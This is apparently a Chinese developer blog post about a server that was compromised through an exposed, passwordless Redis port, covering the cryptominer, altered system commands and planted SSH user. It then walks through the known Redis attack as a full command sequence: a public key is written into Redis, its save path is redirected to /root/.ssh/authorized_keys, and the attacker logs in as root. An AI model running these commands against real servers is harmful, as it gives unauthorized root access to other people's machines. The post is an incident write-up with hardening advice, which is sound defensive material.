---
title: 记录一次服务器因Redis被攻击的案例
date: 2022-06-16 17:26:17
tags:
- redis
- 服务器安全
categories:
- 1933

---

## 背景
最近在开发开源项目Report Monitor时，后端使用到了Redis，为了方便本地调试直接连生产环境，将腾讯云服务器上的Redis端口6379对外开放了（同时没有设置口令和关闭了防火墙）。

<!--more-->
## 过程

### 收到提醒

在开放端口仅仅10分钟后，就收到了腾讯云的告警邮件：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/864e969c234d4711a92fa39525520d5b~tplv-k3u1fbpfcp-watermark.image?)

于是查看机器监控，发现CPU和内存都出现了占用率暴涨的情况，而且外网出包/入包量也是非常不正常，的确被人攻击了：

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ff76d409eee44dc4832d3fb89c0a4bf8~tplv-k3u1fbpfcp-watermark.image?)

### 排查进程


首先top一下看看有没有什么又问题的进程，进入top输入P可以按照cpu占用率排序。结果发现了一个这么个进程rshim，查了一下是肉鸡挖矿的病毒，现在这个端口是7295每当我kill他的时候，他就会在其他随机端口又开启：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f0689b1457bf460fbb9c8fe582c732ed~tplv-k3u1fbpfcp-watermark.image?)

最后，直接进入到`/usr/sbin/rshim`，把内容全删，再也不重启了。

再来查看一下网络情况，程序肯定是把本机的一些数据往外面传了，结果发现这个家伙把我本地好多的命令全部都改了，气死我了，例如下面netstate命令把我的可执行权限给删了：

```
# 查看网络相关信息
netstat -aptn
sudo netstat -aptn

# 查看netstat命令在哪里
which netstat
whereis netstat

# 查看一下netstat程序的相关信息
ls -l /bin/netstat

```

结果提示netstat没有x权限（可执行权限），那就用chmod给它加下x权限，结果发现netstat不能赋值可执行权限，如下所示：

```
sudo chmod +x /bin/netstat
lsattr /bin/netstat
```
结果提示没有权限使用该命令：

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c3c732b88b5044d193cd0adda3de8b40~tplv-k3u1fbpfcp-watermark.image?)

解决方法就是使用chattr命令来更改，把其i属性去除，结果如下所示，chattr命令招不到：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/30b9ce2fc3cd479d8d70f5fb5b11c710~tplv-k3u1fbpfcp-watermark.image?)

原来这个病毒已经预知了你可能会用到的命令，所以直接把这些命令全部干掉了，暂时搁置。


### 排查违规用户

group查看一下目前登录的用户，目前只有我自己的root，没什么问题，在查一下这台服务器上所有的用户：

```
cat /etc/passwd |cut -f 1 -d :
```

发现一下多了一个叫做lsb的用户（老色皮？？），这个不是我创建的，进入`/home/lsb`下，`ls -la`查看一下隐藏文件，确实发现了猫腻：

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eecb67da0f64426cbcc3e9e9ce50fc4c~tplv-k3u1fbpfcp-watermark.image?)

好家伙，直接拿到了我服务器的ssh权限，这就意味着可以直接登陆到我的服务器上操作了，好在时间不长，赶紧删掉：

```
rm -rf .ssh
userdel hilde
```

发现无法删除文件，说没有权限？然后删除用户的时候，还说不能打开这个文件：

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f7e3f921c2314ae39ab7f3f8735750c5~tplv-k3u1fbpfcp-watermark.image?)

发现这个权限中，有a权限，意思是在里面追加，不可删除文件的意思，最后还需要使用chattr命令，好家伙，又回到原点。


### 开始摆烂

经过上诉一顿操作，感觉我的服务器已经被污染了，但又不确定污染了哪些地方，直接备份自己/root目录下的文件，然后重新初始化服务器实例。


## 攻击原理

Redis 默认配置为6379端口无密码访问，如果Redis以root用户启动，攻击者可以通过公网直接连接Redis，向root账户写入SSH公钥文件，以此获取服务器权限注入病毒。

### 具体流程模拟

首先在本地生产公私钥文件：

```
$ssh-keygen –t rsa
```

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/462eefad34b54fd5a2f73b70ea532787~tplv-k3u1fbpfcp-watermark.image?)

然后将公钥写入key.txt文件：

```
$ (echo -e "  "; cat id_rsa.pub; echo -e "  ") > foo.txt
```

再连接Redis写入文件：

```
$ cat key.txt | redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379> config set dir /root/.ssh/
OK
$ 192.168.1.11:6379> config get dir
1) "dir"
2) "/root/.ssh"
$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
OK
$ 192.168.1.11:6379> save
OK
```

Redis（只在root启动下）关键在利用了config个配置指令功能，传递了ssh的key。如果不是已root启动redis，可能只会被清除数据。

这样就可以成功的将自己的公钥写入/root/.ssh文件夹的authotrized_keys文件里，然后攻击者直接执行：

```
$ ssh –i  id_rsa root@192.168.1.11
```

即可远程利用自己的私钥登录该服务器。


## 总结

1. 一些重要的端口不要随便对外开放。
2. 如果迫不得已端口需要开放，请配置好相关密码，密码尽量不要太简单，要不然容易被暴力破解。
3. 如无必要，不要以root权限运行redis。Windows系统下不要以system权限运行。
